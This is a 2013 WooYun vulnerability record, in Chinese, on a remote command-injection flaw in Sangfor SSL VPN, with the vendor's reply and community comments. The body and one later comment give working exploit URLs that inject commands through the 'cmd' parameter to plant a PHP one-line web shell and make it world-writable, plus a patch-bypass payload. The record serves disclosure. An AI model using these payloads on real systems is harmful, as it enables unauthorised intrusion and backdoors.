{"id": 14349, "wybug_id": "wooyun-2013-017323", "wybug_title": "深信服ssl vpn远程代码执行漏洞", "wybug_corp": "深信服", "wybug_author": "none", "wybug_date": "2013-01-15 11:48", "wybug_open_date": "2013-03-01 11:48", "wybug_type": "设计不当", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["代码执行", "远程代码执行", "深信服不可信"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-03-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-03-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-03-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-03-01：\t细节向公众公开  简要描述： 深信服的程序员安全意识太低了,直接一个参数可以执行任意命令 详细说明：  $args = $_REQUEST['cmd'];/*something here*/exec(\"tsutil -proxy $ip $args\", $output, $ret);懂php exec函数的都一眼看出问题版本SSLVPN M5.6及以下 没测试最新版本http://SSLVPN.SANGFOR.COM:1000/cgi-bin/php-cgi/html/daemon/tsproxy.php?cmd=ifconfig||echo%20'%3C?php%20eval($_POST[cmd]);?%3E'%20%3E/app/usr/sbin/webui/html/svpn.php\n\n执行echo '<?php eval($_POST[cmd]);?>' >/app/usr/sbin/webui/html/svpn.php 生成一句话http://SSLVPN.SANGFOR.COM:1000/cgi-bin/php-cgi/html/daemon/tsproxy.php?cmd=ifconfig||chmod 777 /app/usr/sbin/webui/html/svpn.php\n\n修改svpn权限\n\nSSLVPN.SANGFOR.COM不是真实地址 只是一个例子   漏洞证明：  \n\n\n\n\n\n$args = $_REQUEST['cmd'];$ip = $_SERVER['REMOTE_ADDR'];exec(\"tsutil -proxy $ip $args\", $output, $ret);   修复方案：  哎 我还能说什么去找人做个程序员安全编程意识培训吧   版权声明：转载请注明来源 none@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-01-15 14:52 厂商回复： none提交的该漏洞，在M5.65版本及以上版本里已经修复，M5.6及以下版本有手动补丁包可以解决该问题。但考虑到漏洞本身的影响，依然评为高危漏洞。非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-15 12:10 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这个不是不开源的么 不开源的很多应用都会有这个问题    \n     2013-01-15 12:32 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  嗯？    \n     2013-01-15 12:36 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  擦，深信服这是要火呀~    \n     2013-01-15 13:43 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  原因 传参数 直接达成 命令行拼接执行 比SQL拼接还可怕    \n     2013-01-15 13:49 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  留名，要火    \n     2013-01-15 13:59 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  =-=！纳尼，不登陆就可以执行啦？    \n     2013-01-15 15:34 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  厂商靠谱！    \n     2013-01-15 15:43 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  厂商速度很快~    \n     2013-01-15 20:09 |    \t\tqiaoy \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:16        )\t\t \n  .    \n     2013-01-16 02:29 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  这种网络设备经常出现，比如中兴的设备。    \n     2013-01-16 09:25 |    \t\t紫梦芊 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:9        | 踏踏实实做测试)\t\t \n  按照描述可知道 代码大致是类如这样的 system(\"chmod 777 $_REQUEST['file']\");这样的 程序员也许有意识到file参数有&&会被HTTP过滤掉 但是||绝对是能达到效果的    \n     2013-01-16 09:25 |    \t\t紫梦芊 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:9        | 踏踏实实做测试)\t\t \n  按照描述可知道 代码大致是类如这样的 system(\"chmod 777 $_REQUEST['file']\");这样的 程序员也许有意识到file参数有&&会被HTTP过滤掉 但是||绝对是能达到效果的    \n     2013-01-16 09:39 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @无敌L.t.H 来两发    \n     2013-01-16 11:53 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  @xsser 来点中兴 华三 锐捷 迈普的    \n     2013-03-12 18:03 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  这个漏洞才给了5分？有点少了。    \n     2013-03-14 11:24 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  没堵住啊~哎tsproxy.php?cmd=(ifconfig%20\\'%20||echo%20\"<? eval($_POST[cmd])?>\" >any.php||a\\')    \n     2013-03-14 11:28 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @none 再来一发    \n     2013-03-14 11:31 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  PHP……用C就行了吧    \n     2013-03-18 14:24 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  @无敌L.t.H 不在于用什么 而在于意识    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}